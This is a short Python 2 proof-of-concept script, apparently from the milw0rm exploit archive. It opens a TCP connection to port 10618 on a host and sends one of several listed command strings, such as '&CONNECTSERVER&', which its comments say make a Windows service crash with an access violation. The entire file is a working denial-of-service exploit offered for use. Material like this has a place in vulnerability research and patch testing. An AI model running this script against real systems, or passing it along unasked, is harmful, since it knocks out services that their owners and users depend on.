#!c:\python\python.exe
# uncomment whichever function youd like. theyll all crash in a similar way.

# Any of the following "function names" will cause the service to throw an access violation 
# while dereferencing the return value from a call to FindIndex 
# ( http://msdn2.microsoft.com/de-de/library/a93550bb(VS.80).aspx):

# Ethan Hunt <m34r\[@\]hackermail.com>

import socket

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect(('192.168.1.101', 10618))

print "[*] connected"

s.send("&CONNECTSERVER&")
#s.send("&ADDENTRY&")
#s.send("&FIN&")
#s.send("&START&")
#s.send("&LOGPATH&")
#s.send("&FWADELTA&")
#s.send("&FWALOG&")
#s.send("&SETSYNCHRONOUS&")
#s.send("&SETPRGFILE&")
#s.send("&SETREPLYPORT&")

print "disconnecting."

s.close()

# milw0rm.com [2007-01-10]
